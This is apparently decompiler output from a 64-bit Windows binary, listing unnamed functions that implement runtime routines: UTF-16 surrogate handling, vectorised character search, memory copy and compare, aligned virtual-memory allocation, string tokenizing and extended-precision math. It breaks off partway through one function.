ushort * FUN_14000b510(ushort *param_1,longlong param_2,ushort param_3,ushort *param_4)

{
  undefined8 uVar1;
  ushort *puVar2;
  uint3 local_58 [2];
  short local_4e [2];
  ushort local_4a;
  ushort local_48;
  short local_46;
  byte local_44;
  
  if (((param_3 & 0xfc00) == 0xdc00 && (char)param_4[1] != '\0') &&
     (local_4a = *param_4, (local_4a & 0xfc00) == 0xd800)) {
    local_48 = param_3;
    FUN_1400084f1((undefined8 *)local_58,&local_4a);
    FUN_1400083ed(local_4e,(uint)local_58[0]);
    *(longlong *)(param_2 + 0x40) = *(longlong *)(param_2 + 0x40) + 1;
    param_1[0] = 0;
    param_1[1] = 0;
  }
  else {
    uVar1 = *(undefined8 *)(param_2 + 0x40);
    FUN_140008399((undefined4 *)&local_46,(uint)param_3);
    if (local_46 == 0) {
                    /* WARNING: Could not emulate address calculation at 0x00014000b5e0 */
                    /* WARNING: Treating indirect jump as call */
      puVar2 = (ushort *)
               (*(code *)(&DAT_140017080 + *(int *)(&DAT_140017080 + (ulonglong)(local_44 - 1) * 4))
               )(&DAT_140017080 + *(int *)(&DAT_140017080 + (ulonglong)(local_44 - 1) * 4));
      return puVar2;
    }
    *(undefined8 *)(param_2 + 0x40) = uVar1;
    *param_1 = param_3;
    *(undefined1 *)(param_1 + 1) = 1;
  }
  return param_1;
}


// ==== FUN_14000b69c @ 14000b69c size 58

longlong FUN_14000b69c(longlong param_1,uint param_2,ulonglong param_3)

{
  longlong lVar1;
  ulonglong local_28;
  char local_20;
  
  FUN_14000b70f(&local_28,param_1,param_3,param_2);
  lVar1 = 0;
  if (local_20 != '\0') {
    lVar1 = param_1 + local_28 * 2;
  }
  return lVar1;
}


// ==== FUN_14000b6d6 @ 14000b6d6 size 57

ulonglong FUN_14000b6d6(longlong param_1,ulonglong param_2)

{
  ulonglong local_28;
  char local_20;
  
  FUN_14000b70f(&local_28,param_1,param_2,0);
  if (local_20 != '\0') {
    param_2 = local_28;
  }
  return param_2;
}


// ==== FUN_14000b70f @ 14000b70f size 665

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_14000b70f(ulonglong *param_1,longlong param_2,ulonglong param_3,uint param_4)

{
  short *psVar1;
  undefined8 uVar2;
  undefined4 uVar3;
  ulonglong uVar4;
  undefined1 uVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  uint in_R11D;
  int iVar8;
  short sVar13;
  short sVar14;
  short sVar15;
  undefined1 auVar9 [16];
  undefined1 auVar10 [16];
  undefined1 auVar11 [16];
  short sVar16;
  undefined1 auVar12 [16];
  uint uVar17;
  uint uVar18;
  undefined1 in_XMM1 [16];
  undefined1 auVar19 [16];
  undefined1 auVar20 [16];
  ushort uVar21;
  ushort uVar22;
  ushort uVar27;
  undefined1 auVar23 [16];
  undefined1 auVar24 [16];
  undefined1 auVar25 [16];
  undefined1 auVar26 [16];
  uint uVar28;
  undefined1 auVar29 [16];
  undefined4 local_14;
  undefined3 uStack_10;
  
  if (param_3 != 0) {
    uVar22 = (ushort)DAT_140017090;
    if (param_3 < 0x11) {
      uVar4 = 0;
    }
    else {
      auVar9 = pshuflw(ZEXT416(param_4),ZEXT416(param_4),0);
      uVar6 = 0;
      do {
        psVar1 = (short *)(param_2 + uVar6 * 2);
        sVar13 = auVar9._0_2_;
        auVar19._0_2_ = -(ushort)(*psVar1 == sVar13);
        sVar14 = auVar9._2_2_;
        auVar19._2_2_ = -(ushort)(psVar1[1] == sVar14);
        sVar16 = auVar9._4_2_;
        auVar19._4_2_ = -(ushort)(psVar1[2] == sVar16);
        sVar15 = auVar9._6_2_;
        auVar19._6_2_ = -(ushort)(psVar1[3] == sVar15);
        auVar19._8_2_ = -(ushort)(psVar1[4] == sVar13);
        auVar19._10_2_ = -(ushort)(psVar1[5] == sVar14);
        auVar19._12_2_ = -(ushort)(psVar1[6] == sVar16);
        auVar19._14_2_ = -(ushort)(psVar1[7] == sVar15);
        if ((((((((((((((((SUB161(auVar19 >> 7,0) & 1) != 0 || (SUB161(auVar19 >> 0xf,0) & 1) != 0)
                        || (SUB161(auVar19 >> 0x17,0) & 1) != 0) ||
                       (SUB161(auVar19 >> 0x1f,0) & 1) != 0) || (SUB161(auVar19 >> 0x27,0) & 1) != 0
                      ) || (SUB161(auVar19 >> 0x2f,0) & 1) != 0) ||
                    (SUB161(auVar19 >> 0x37,0) & 1) != 0) || (SUB161(auVar19 >> 0x3f,0) & 1) != 0)
                  || (SUB161(auVar19 >> 0x47,0) & 1) != 0) || (SUB161(auVar19 >> 0x4f,0) & 1) != 0)
                || (SUB161(auVar19 >> 0x57,0) & 1) != 0) || (SUB161(auVar19 >> 0x5f,0) & 1) != 0) ||
              (SUB161(auVar19 >> 0x67,0) & 1) != 0) || (SUB161(auVar19 >> 0x6f,0) & 1) != 0) ||
            (auVar19._14_2_ >> 7 & 1) != 0) || (auVar19._14_2_ & 0x8000) != 0) {
          auVar9 = auVar19 & _DAT_1400170a0 | ~auVar19 & _DAT_140017090;
          auVar25._0_8_ = auVar9._8_8_;
          auVar25._8_4_ = auVar9._8_4_;
          auVar25._12_4_ = auVar9._12_4_;
          auVar25 = auVar25 & _DAT_140017090;
          sVar13 = auVar9._0_2_;
          sVar14 = auVar25._0_2_;
          uVar21 = (ushort)(sVar13 < sVar14) * sVar13 | (ushort)(sVar13 >= sVar14) * sVar14;
          sVar13 = auVar9._2_2_;
          sVar14 = auVar25._2_2_;
          uVar27 = (ushort)(sVar13 < sVar14) * sVar13 | (ushort)(sVar13 >= sVar14) * sVar14;
          sVar13 = auVar9._4_2_;
          sVar16 = auVar25._4_2_;
          sVar14 = auVar9._6_2_;
          sVar15 = auVar25._6_2_;
          uVar3 = CONCAT22((ushort)(sVar14 < sVar15) * sVar14 | (ushort)(sVar14 >= sVar15) * sVar15,
                           (ushort)(sVar13 < sVar16) * sVar13 | (ushort)(sVar13 >= sVar16) * sVar16)
          ;
          auVar9._4_4_ = uVar3;
          auVar9._0_4_ = uVar3;
          auVar9._8_4_ = uVar3;
          auVar9._12_4_ = uVar3;
          sVar13 = SUB162(auVar9 & _DAT_140017090,0);
          uVar21 = ((short)uVar21 < sVar13) * uVar21 | (ushort)((short)uVar21 >= sVar13) * sVar13;
          sVar13 = SUB162(auVar9 & _DAT_140017090,2);
          uVar22 = (((short)uVar27 < sVar13) * uVar27 | (ushort)((short)uVar27 >= sVar13) * sVar13)
                   & uVar22;
          uVar4 = ((ushort)(((short)uVar21 < (short)uVar22) * uVar21 |
                           ((short)uVar21 >= (short)uVar22) * uVar22) & 7) + uVar6;
          goto LAB_14000b98e;
        }
        psVar1 = (short *)(param_2 + 0x10 + uVar6 * 2);
        in_XMM1._0_2_ = -(ushort)(*psVar1 == sVar13);
        in_XMM1._2_2_ = -(ushort)(psVar1[1] == sVar14);
        in_XMM1._4_2_ = -(ushort)(psVar1[2] == sVar16);
        in_XMM1._6_2_ = -(ushort)(psVar1[3] == sVar15);
        in_XMM1._8_2_ = -(ushort)(psVar1[4] == sVar13);
        in_XMM1._10_2_ = -(ushort)(psVar1[5] == sVar14);
        in_XMM1._12_2_ = -(ushort)(psVar1[6] == sVar16);
        in_XMM1._14_2_ = -(ushort)(psVar1[7] == sVar15);
        if ((((((((((((((((SUB161(in_XMM1 >> 7,0) & 1) != 0 || (SUB161(in_XMM1 >> 0xf,0) & 1) != 0)
                        || (SUB161(in_XMM1 >> 0x17,0) & 1) != 0) ||
                       (SUB161(in_XMM1 >> 0x1f,0) & 1) != 0) || (SUB161(in_XMM1 >> 0x27,0) & 1) != 0
                      ) || (SUB161(in_XMM1 >> 0x2f,0) & 1) != 0) ||
                    (SUB161(in_XMM1 >> 0x37,0) & 1) != 0) || (SUB161(in_XMM1 >> 0x3f,0) & 1) != 0)
                  || (SUB161(in_XMM1 >> 0x47,0) & 1) != 0) || (SUB161(in_XMM1 >> 0x4f,0) & 1) != 0)
                || (SUB161(in_XMM1 >> 0x57,0) & 1) != 0) || (SUB161(in_XMM1 >> 0x5f,0) & 1) != 0) ||
              (SUB161(in_XMM1 >> 0x67,0) & 1) != 0) || (SUB161(in_XMM1 >> 0x6f,0) & 1) != 0) ||
            (in_XMM1._14_2_ >> 7 & 1) != 0) || (in_XMM1._14_2_ & 0x8000) != 0) {
          auVar9 = in_XMM1 & _DAT_1400170a0 | ~in_XMM1 & _DAT_140017090;
          auVar26._0_8_ = auVar9._8_8_;
          auVar26._8_4_ = auVar9._8_4_;
          auVar26._12_4_ = auVar9._12_4_;
          auVar26 = auVar26 & _DAT_140017090;
          sVar13 = auVar9._0_2_;
          sVar14 = auVar26._0_2_;
          uVar21 = (ushort)(sVar13 < sVar14) * sVar13 | (ushort)(sVar13 >= sVar14) * sVar14;
          sVar13 = auVar9._2_2_;
          sVar14 = auVar26._2_2_;
          uVar27 = (ushort)(sVar13 < sVar14) * sVar13 | (ushort)(sVar13 >= sVar14) * sVar14;
          sVar13 = auVar9._4_2_;
          sVar16 = auVar26._4_2_;
          sVar14 = auVar9._6_2_;
          sVar15 = auVar26._6_2_;
          uVar3 = CONCAT22((ushort)(sVar14 < sVar15) * sVar14 | (ushort)(sVar14 >= sVar15) * sVar15,
                           (ushort)(sVar13 < sVar16) * sVar13 | (ushort)(sVar13 >= sVar16) * sVar16)
          ;
          auVar20._4_4_ = uVar3;
          auVar20._0_4_ = uVar3;
          auVar20._8_4_ = uVar3;
          auVar20._12_4_ = uVar3;
          sVar13 = SUB162(auVar20 & _DAT_140017090,0);
          uVar21 = ((short)uVar21 < sVar13) * uVar21 | (ushort)((short)uVar21 >= sVar13) * sVar13;
          sVar13 = SUB162(auVar20 & _DAT_140017090,2);
          uVar22 = (((short)uVar27 < sVar13) * uVar27 | (ushort)((short)uVar27 >= sVar13) * sVar13)
                   & uVar22;
          uVar4 = ((ushort)(((short)uVar21 < (short)uVar22) * uVar21 |
                           ((short)uVar21 >= (short)uVar22) * uVar22) & 7) + uVar6 + 8;
          goto LAB_14000b98e;
        }
        uVar4 = uVar6 + 0x10;
        uVar7 = uVar6 + 0x20;
        uVar6 = uVar4;
      } while (uVar7 < param_3);
    }
    uVar6 = uVar4;
    if (uVar4 + 8 < param_3) {
      auVar9 = pshuflw(ZEXT416(param_4),ZEXT416(param_4),0);
      in_XMM1._0_8_ = auVar9._0_8_;
      in_XMM1._8_4_ = auVar9._0_4_;
      in_XMM1._12_4_ = auVar9._4_4_;
      psVar1 = (short *)(param_2 + uVar4 * 2);
      auVar10._0_2_ = -(ushort)(*psVar1 == auVar9._0_2_);
      auVar10._2_2_ = -(ushort)(psVar1[1] == auVar9._2_2_);
      auVar10._4_2_ = -(ushort)(psVar1[2] == auVar9._4_2_);
      auVar10._6_2_ = -(ushort)(psVar1[3] == auVar9._6_2_);
      auVar10._8_2_ = -(ushort)(psVar1[4] == auVar9._0_2_);
      auVar10._10_2_ = -(ushort)(psVar1[5] == auVar9._2_2_);
      auVar10._12_2_ = -(ushort)(psVar1[6] == auVar9._4_2_);
      auVar10._14_2_ = -(ushort)(psVar1[7] == auVar9._6_2_);
      uVar21 = (ushort)(SUB161(auVar10 >> 7,0) & 1) | (ushort)(SUB161(auVar10 >> 0xf,0) & 1) << 1 |
               (ushort)(SUB161(auVar10 >> 0x17,0) & 1) << 2 |
               (ushort)(SUB161(auVar10 >> 0x1f,0) & 1) << 3 |
               (ushort)(SUB161(auVar10 >> 0x27,0) & 1) << 4 |
               (ushort)(SUB161(auVar10 >> 0x2f,0) & 1) << 5 |
               (ushort)(SUB161(auVar10 >> 0x37,0) & 1) << 6 |
               (ushort)(SUB161(auVar10 >> 0x3f,0) & 1) << 7 |
               (ushort)(SUB161(auVar10 >> 0x47,0) & 1) << 8 |
               (ushort)(SUB161(auVar10 >> 0x4f,0) & 1) << 9 |
               (ushort)(SUB161(auVar10 >> 0x57,0) & 1) << 10 |
               (ushort)(SUB161(auVar10 >> 0x5f,0) & 1) << 0xb |
               (ushort)(SUB161(auVar10 >> 0x67,0) & 1) << 0xc |
               (ushort)(SUB161(auVar10 >> 0x6f,0) & 1) << 0xd |
               (ushort)((byte)(auVar10._14_2_ >> 7) & 1) << 0xe | auVar10._14_2_ & 0x8000;
      in_R11D = (uint)uVar21;
      uVar6 = uVar4 + 8;
      if (uVar21 != 0) {
        auVar9 = auVar10 & _DAT_1400170a0 | ~auVar10 & _DAT_140017090;
        auVar23._0_8_ = auVar9._8_8_;
        auVar23._8_4_ = auVar9._8_4_;
        auVar23._12_4_ = auVar9._12_4_;
        auVar23 = auVar23 & _DAT_140017090;
        sVar13 = auVar9._0_2_;
        sVar14 = auVar23._0_2_;
        uVar21 = (ushort)(sVar13 < sVar14) * sVar13 | (ushort)(sVar13 >= sVar14) * sVar14;
        sVar13 = auVar9._2_2_;
        sVar14 = auVar23._2_2_;
        uVar27 = (ushort)(sVar13 < sVar14) * sVar13 | (ushort)(sVar13 >= sVar14) * sVar14;
        sVar13 = auVar9._4_2_;
        sVar16 = auVar23._4_2_;
        sVar14 = auVar9._6_2_;
        sVar15 = auVar23._6_2_;
        uVar3 = CONCAT22((ushort)(sVar14 < sVar15) * sVar14 | (ushort)(sVar14 >= sVar15) * sVar15,
                         (ushort)(sVar13 < sVar16) * sVar13 | (ushort)(sVar13 >= sVar16) * sVar16);
        auVar11._4_4_ = uVar3;
        auVar11._0_4_ = uVar3;
        auVar11._8_4_ = uVar3;
        auVar11._12_4_ = uVar3;
        sVar13 = SUB162(auVar11 & _DAT_140017090,0);
        uVar21 = ((short)uVar21 < sVar13) * uVar21 | (ushort)((short)uVar21 >= sVar13) * sVar13;
        sVar13 = SUB162(auVar11 & _DAT_140017090,2);
        uVar22 = (((short)uVar27 < sVar13) * uVar27 | (ushort)((short)uVar27 >= sVar13) * sVar13) &
                 uVar22;
        uVar4 = uVar4 + ((ushort)(((short)uVar21 < (short)uVar22) * uVar21 |
                                 ((short)uVar21 >= (short)uVar22) * uVar22) & 7);
LAB_14000b98e:
        uVar5 = 1;
        goto LAB_14000b990;
      }
    }
    uVar4 = uVar6;
    if (uVar6 + 4 < param_3) {
      auVar9 = pshuflw(in_XMM1,ZEXT416(param_4),0);
      uVar2 = *(undefined8 *)(param_2 + uVar6 * 2);
      auVar12._0_2_ = -(ushort)((short)uVar2 == auVar9._0_2_);
      sVar13 = -(ushort)((short)((ulonglong)uVar2 >> 0x10) == auVar9._2_2_);
      sVar14 = -(ushort)((short)((ulonglong)uVar2 >> 0x20) == auVar9._4_2_);
      sVar16 = -(ushort)((short)((ulonglong)uVar2 >> 0x30) == auVar9._6_2_);
      auVar12._8_8_ =
           (undefined8)
           (CONCAT64(CONCAT42(CONCAT22(sVar16,sVar16),sVar14),CONCAT22(sVar14,sVar16)) >> 0x10);
      auVar12._6_2_ = sVar13;
      auVar12._4_2_ = sVar13;
      auVar12._2_2_ = auVar12._0_2_;
      iVar8 = movmskps(in_R11D,auVar12);
      uVar4 = uVar6 + 4;
      if (iVar8 != 0) {
        auVar9 = auVar12 & _DAT_1400170c0 | ~auVar12 & _DAT_1400170b0;
        auVar24._0_8_ = auVar9._8_8_;
        auVar24._8_4_ = auVar9._8_4_;
        auVar24._12_4_ = auVar9._12_4_;
        auVar29._0_4_ = -(uint)(auVar9._0_4_ < auVar9._8_4_);
        auVar29._4_4_ = -(uint)(auVar9._4_4_ < auVar9._12_4_);
        auVar29._8_8_ = 0;
        auVar9 = ~auVar29 & auVar24 | auVar9 & auVar29;
        uVar28 = auVar9._0_4_;
        uVar17 = auVar9._4_4_ & (uint)DAT_1400170b0;
        uVar18 = -(uint)((int)uVar28 < (int)uVar17);
        uVar4 = uVar6 + ((~uVar18 & uVar17 | uVar28 & uVar18) & 3);
        uVar5 = 1;
        goto LAB_14000b990;
      }
    }
    for (; param_3 != uVar4; uVar4 = uVar4 + 1) {
      if (*(short *)(param_2 + uVar4 * 2) == (short)param_4) goto LAB_14000b98e;
    }
  }
  uStack_10 = 0;
  local_14 = 0;
  uVar4 = 0;
  uVar5 = 0;
LAB_14000b990:
  *param_1 = uVar4;
  *(undefined1 *)(param_1 + 1) = uVar5;
  *(undefined4 *)((longlong)param_1 + 9) = local_14;
  *(uint *)((longlong)param_1 + 0xc) = CONCAT31(uStack_10,local_14._3_1_);
  return;
}


// ==== FUN_14000b9a8 @ 14000b9a8 size 29

void FUN_14000b9a8(longlong param_1,undefined2 param_2,longlong param_3)

{
  longlong lVar1;
  
  for (lVar1 = 0; param_3 * 2 != lVar1; lVar1 = lVar1 + 2) {
    *(undefined2 *)(param_1 + lVar1) = param_2;
  }
  return;
}


// ==== FUN_14000b9c5 @ 14000b9c5 size 13

void FUN_14000b9c5(ulonglong param_1,ulonglong param_2,longlong param_3)

{
  FUN_14000d56b(param_1,param_2,param_3 * 2);
  return;
}


// ==== FUN_14000b9d2 @ 14000b9d2 size 37

longlong FUN_14000b9d2(longlong param_1,longlong param_2,longlong param_3)

{
  ulonglong uVar1;
  
  if (param_3 * 2 != 0) {
    uVar1 = 0;
    do {
      *(undefined1 *)(param_1 + uVar1) = *(undefined1 *)(param_2 + uVar1);
      uVar1 = uVar1 + 1;
    } while (uVar1 < (ulonglong)(param_3 * 2));
  }
  return param_1 + param_3 * 2;
}


// ==== FUN_14000b9f7 @ 14000b9f7 size 32

void FUN_14000b9f7(longlong param_1,longlong param_2,longlong param_3)

{
  ulonglong uVar1;
  
  if (param_3 * 2 != 0) {
    uVar1 = 0;
    do {
      *(undefined1 *)(param_1 + uVar1) = *(undefined1 *)(param_2 + uVar1);
      uVar1 = uVar1 + 1;
    } while (uVar1 < (ulonglong)(param_3 * 2));
  }
  return;
}


// ==== FUN_14000ba17 @ 14000ba17 size 75

undefined8 FUN_14000ba17(longlong param_1,longlong param_2,longlong param_3)

{
  ushort uVar1;
  ushort uVar2;
  longlong lVar3;
  char cVar4;
  
  if (param_1 != param_2) {
    for (lVar3 = 0; param_3 != lVar3; lVar3 = lVar3 + 1) {
      uVar1 = *(ushort *)(param_1 + lVar3 * 2);
      uVar2 = *(ushort *)(param_2 + lVar3 * 2);
      cVar4 = uVar1 < uVar2;
      if (uVar1 == uVar2) {
        cVar4 = '\x02';
      }
      if (cVar4 != '\x02') {
        if (cVar4 == '\0') {
          return 1;
        }
        return 0xffffffffffffffff;
      }
    }
  }
  return 0;
}


// ==== FUN_14000ba62 @ 14000ba62 size 406

/* WARNING: Type propagation algorithm not settling */

ulonglong FUN_14000ba62(undefined8 param_1,ulonglong param_2,byte param_3)

{
  ulonglong uVar1;
  int iVar2;
  longlong lVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  longlong lVar6;
  longlong local_70;
  longlong local_68;
  longlong local_60;
  ulonglong local_58 [3];
  ulonglong local_40;
  byte local_31;
  
  local_31 = param_3 & 0x3f;
  if (param_2 < 0xffffffffffffefff) {
    lVar3 = 1L << local_31;
    local_40 = 0;
    local_58[2] = param_2;
    iVar2 = NtAllocateVirtualMemory(0xffffffffffffffff,&local_40,0,local_58 + 2,0x3000,4);
    if (iVar2 == 0) {
      if ((lVar3 - 1U & local_40) == 0) {
        return local_40;
      }
      local_58[1] = 0;
      NtFreeVirtualMemory(0xffffffffffffffff,&local_40,local_58 + 1,0x8000);
    }
    local_40 = 0;
    lVar6 = param_2 + lVar3 + -0x1000;
    local_58[2] = lVar6;
    iVar2 = NtAllocateVirtualMemory(0xffffffffffffffff,&local_40,0,local_58 + 2,0x42000,1);
    uVar1 = local_40;
    if (iVar2 != 0) {
      return 0;
    }
    uVar5 = param_2 + 0xfff & 0xfffffffffffff000;
    uVar4 = -lVar3 & (lVar3 + local_40) - 1;
    if (uVar4 - local_40 != 0) {
      local_58[0] = local_40;
      local_60 = uVar4 - local_40;
      NtFreeVirtualMemory(0xffffffffffffffff,local_58,&local_60,0x8002);
    }
    lVar3 = (lVar6 + uVar1) - (uVar4 + uVar5);
    if (lVar3 != 0) {
      local_70 = lVar3;
      local_68 = uVar4 + uVar5;
      NtFreeVirtualMemory(0xffffffffffffffff,&local_68,&local_70,0x8002);
    }
    local_58[2] = uVar5;
    local_40 = uVar4;
    iVar2 = NtAllocateVirtualMemory(0xffffffffffffffff,&local_40,0,local_58 + 2,0x1000,4);
    if (iVar2 == 0) {
      return local_40;
    }
    local_58[2] = uVar5;
    local_40 = uVar4;
    NtFreeVirtualMemory(0xffffffffffffffff,&local_40,local_58 + 2,0x8000);
  }
  return 0;
}


// ==== FUN_14000bbf8 @ 14000bbf8 size 49

void FUN_14000bbf8(undefined8 param_1,undefined8 param_2)

{
  undefined8 local_18;
  undefined8 local_10;
  
  local_18 = 0;
  local_10 = param_2;
  NtFreeVirtualMemory(0xffffffffffffffff,&local_10,&local_18,0x8000);
  return;
}


// ==== FUN_14000bc29 @ 14000bc29 size 26

void FUN_14000bc29(undefined8 param_1,longlong param_2,ulonglong param_3,byte param_4,
                  ulonglong param_5)

{
  FUN_14000bc43(param_2,param_3,param_4,param_5);
  return;
}


// ==== FUN_14000bc43 @ 14000bc43 size 152

longlong FUN_14000bc43(longlong param_1,ulonglong param_2,byte param_3,ulonglong param_4)

{
  longlong local_28;
  ulonglong local_20;
  byte local_11;
  
  local_11 = param_3 & 0x3f;
  if (local_11 < 0xd) {
    if (param_2 < param_4) {
      if ((param_2 + 0xfff & 0xfffffffffffff000) < (param_4 + 0xfff & 0xfffffffffffff000)) {
        param_1 = 0;
      }
    }
    else {
      local_20 = param_1 + param_4 + 0xfff & 0xfffffffffffff000;
      local_28 = (param_2 + param_1) - local_20;
      if (local_20 <= param_2 + param_1 && local_28 != 0) {
        NtAllocateVirtualMemory(0xffffffffffffffff,&local_20,0,&local_28,0x80000,1);
      }
    }
  }
  else {
    param_1 = 0;
  }
  return param_1;
}


// ==== FUN_14000bcdb @ 14000bcdb size 43

bool FUN_14000bcdb(undefined8 param_1,longlong param_2,ulonglong param_3,byte param_4,
                  ulonglong param_5)

{
  longlong lVar1;
  
  lVar1 = FUN_14000bc43(param_2,param_3,param_4,param_5);
  return lVar1 != 0;
}


// ==== FUN_14000bd06 @ 14000bd06 size 54

ulonglong FUN_14000bd06(longlong param_1,ulonglong param_2)

{
  ulonglong local_28;
  char local_20;
  
  FUN_14000662b(&local_28,param_1,param_2);
  if (local_20 != '\0') {
    param_2 = local_28;
  }
  return param_2;
}


// ==== FUN_14000bd3c @ 14000bd3c size 177

longlong FUN_14000bd3c(longlong param_1,longlong param_2,longlong *param_3)

{
  char *pcVar1;
  ulonglong uVar2;
  longlong lVar3;
  longlong lVar4;
  longlong lVar5;
  ulonglong uVar6;
  longlong local_40;
  char local_38;
  
  if ((param_1 != 0) || (param_1 = *param_3, param_1 != 0)) {
    lVar4 = param_2;
    uVar2 = FUN_14000d53c(param_1);
    lVar3 = FUN_1400053fc(param_2);
    if (uVar2 != 0) {
      for (uVar6 = 0; uVar6 != uVar2; uVar6 = uVar6 + 1) {
        lVar5 = 0;
        do {
          if (lVar4 == lVar5) {
            FUN_140006e54(&local_40,param_1,uVar2,uVar6,lVar3,lVar4);
            if (local_38 != '\0') {
              *(undefined1 *)(param_1 + local_40) = 0;
              uVar2 = local_40 + 1;
            }
            *param_3 = uVar2 + param_1;
            return uVar6 + param_1;
          }
          pcVar1 = (char *)(lVar3 + lVar5);
          lVar5 = lVar5 + 1;
        } while (*(char *)(param_1 + uVar6) != *pcVar1);
      }
    }
  }
  return 0;
}


// ==== FUN_14000bded @ 14000bded size 35

longlong FUN_14000bded(longlong param_1,longlong param_2,ulonglong param_3)

{
  ulonglong uVar1;
  
  if (param_3 != 0) {
    uVar1 = 0;
    do {
      *(undefined1 *)(param_1 + uVar1) = *(undefined1 *)(param_2 + uVar1);
      uVar1 = uVar1 + 1;
    } while (uVar1 < param_3);
  }
  return param_1 + param_3;
}


// ==== FUN_14000be10 @ 14000be10 size 15

bool FUN_14000be10(double param_1)

{
  return NAN(param_1);
}


// ==== FUN_14000be1f @ 14000be1f size 17

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

float10 * FUN_14000be1f(float10 *param_1)

{
  *param_1 = (float10)_DAT_1400170d0;
  return param_1;
}


// ==== FUN_14000be30 @ 14000be30 size 45

float10 * FUN_14000be30(float10 *param_1,float10 *param_2,undefined1 (*param_3) [10])

{
  float10 fVar1;
  undefined1 uStack_f;
  
  uStack_f = SUB101(*param_3,9);
  fVar1 = ABS(*param_2);
  if ((uStack_f & 0x80) != 0) {
    fVar1 = -ABS(*param_2);
  }
  *param_1 = fVar1;
  return param_1;
}


// ==== FUN_14000be5d @ 14000be5d size 457

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_14000be5d(float10 *param_1,float10 *param_2)

{
  uint uVar1;
  ushort uVar2;
  float10 fVar3;
  float10 fVar4;
  float10 fVar5;
  ulonglong uStack_20;
  ushort uStack_10;
  
  fVar5 = *param_2;
  uStack_10 = (ushort)((unkuint10)fVar5 >> 0x40);
  uStack_20 = (ulonglong)(uStack_10 & 0x7fff);
  uVar2 = (ushort)(uStack_10 & 0x7fff);
  if (uVar2 < 0x4040) {
    uVar1 = (uint)((unkuint10)fVar5 >> 0x20) >> 0x17 & 0xff | (uStack_10 & 0x7fff) << 8;
    if (uVar1 < 0x3ffdc0) {
      fVar3 = fVar5;
      if (uVar2 < 0x3fdf) goto LAB_14000c01e;
    }
    else {
      fVar5 = ABS(fVar5);
      if (uVar1 < 0x3fff30) {
        if (uVar1 < 0x3ffe60) {
          fVar5 = (-(float10)1 + fVar5 + fVar5) / (fVar5 + (float10)_DAT_1400170e8);
          uStack_20 = 0;
        }
        else {
          fVar5 = (-(float10)1 + fVar5) / (fVar5 + (float10)1);
          uStack_20 = 1;
        }
      }
      else if (uVar1 < 0x400038) {
        fVar5 = (fVar5 + (float10)_DAT_1400170e0) / ((float10)1 + fVar5 * (float10)_DAT_1400170e4);
        uStack_20 = 2;
      }
      else {
        fVar5 = -(float10)1 / fVar5;
        uStack_20 = 3;
      }
    }
    fVar3 = fVar5 * fVar5;
    fVar4 = fVar3 * fVar3;
    fVar3 = (_DAT_140017150 +
            (_DAT_140017140 +
            (_DAT_140017130 +
            (_DAT_140017120 +
            (_DAT_140017110 + (_DAT_140017100 + _DAT_1400170f0 * fVar4) * fVar4) * fVar4) * fVar4) *
            fVar4) * fVar4) * fVar3;
    fVar4 = (_DAT_1400171b0 +
            (_DAT_1400171a0 +
            (_DAT_140017190 +
            (_DAT_140017180 + (_DAT_140017170 + _DAT_140017160 * fVar4) * fVar4) * fVar4) * fVar4) *
            fVar4) * fVar4;
    if (uVar1 < 0x3ffdc0) {
      fVar3 = fVar5 - (fVar4 + fVar3) * fVar5;
    }
    else {
      fVar5 = *(float10 *)(&DAT_14002ddf0 + uStack_20 * 0x10) -
              (((fVar4 + fVar3) * fVar5 - *(float10 *)(&DAT_14002de30 + uStack_20 * 0x10)) - fVar5);
      fVar3 = -fVar5;
      if (-1 < (short)uStack_10) {
        fVar3 = fVar5;
      }
    }
  }
  else {
    fVar3 = *(float10 *)(&DAT_1400171c0 + (ulonglong)(-1 < (short)uStack_10) * 0x10);
    if (NAN(fVar5)) {
      fVar3 = fVar5;
    }
  }
LAB_14000c01e:
  *param_1 = fVar3;
  return;
}


// ==== FUN_14000c026 @ 14000c026 size 183

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined1 (*) [10]
FUN_14000c026(undefined1 (*param_1) [10],undefined1 (*param_2) [10],undefined1 (*param_3) [10])

{
  undefined1 auVar1 [10];
  undefined1 auVar2 [10];
  undefined1 auVar3 [10];
  undefined1 local_58 [2] [10];
  undefined1 local_44 [10];
  undefined1 local_38 [10];
  longlong local_28;
  short sStack_20;
  
  local_44 = *param_2;
  if ((float10)_DAT_1400171e0 < (float10)local_44) {
    if ((float10)local_44 < (float10)_DAT_1400171e4) {
      if (NAN((float10)local_44)) {
        auVar1 = (undefined1  [10])(float10)_DAT_1400171e8;
        *param_3 = auVar1;
      }
      else {
        local_38 = local_44;
        FUN_14000d708(local_58,&local_38);
        sStack_20 = local_44._8_2_;
        auVar1 = (undefined1  [10])((float10)local_44 - (float10)local_58[0]);
        auVar2 = (undefined1  [10])-(float10)0;
        auVar3 = auVar2;
        if ((float10)local_44 != (float10)local_58[0]) {
          auVar3 = auVar1;
        }
        if (NAN((float10)local_44) || NAN((float10)local_58[0])) {
          auVar3 = auVar1;
        }
        if ((float10)local_44 < (float10)0) {
          auVar1 = auVar3;
        }
        *param_3 = local_58[0];
        local_28 = local_44._0_8_;
        if (sStack_20 == -0x8000 && local_28 == 0) {
          auVar1 = auVar2;
        }
      }
    }
    else {
      *param_3 = (undefined1  [10])(float10)_DAT_1400171e4;
      auVar1 = (undefined1  [10])(float10)0;
    }
  }
  else {
    *param_3 = (undefined1  [10])(float10)_DAT_1400171e0;
    auVar1 = (undefined1  [10])-(float10)0;
  }
  *param_1 = auVar1;
  return param_1;
}


// ==== FUN_14000c0dd @ 14000c0dd size 1396

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

float10 * FUN_14000c0dd(float10 *param_1,float10 *param_2,float10 *param_3)

{
  float10 fVar1;
  float10 fVar2;
  float10 local_378;
  float10 local_368;
  float10 local_358;
  float10 local_348;
  float10 local_338;
  float10 local_328;
  float10 local_318;
  float10 local_308;
  float10 local_2f8;
  float10 local_2e8;
  float10 local_2d8;
  float10 local_2c8;
  float10 local_2b8;
  float10 local_2a8;
  float10 local_298;
  float10 local_288;
  float10 local_278;
  float10 local_268;
  float10 local_258;
  float10 local_248;
  float10 local_238;
  float10 local_228;
  float10 local_218;
  float10 local_208;
  float10 local_1f8;
  float10 local_1e8;
  float10 local_1d8;
  float10 local_1c8;
  float10 local_1b8;
  float10 local_1a8;
  float10 local_198;
  float10 local_188;
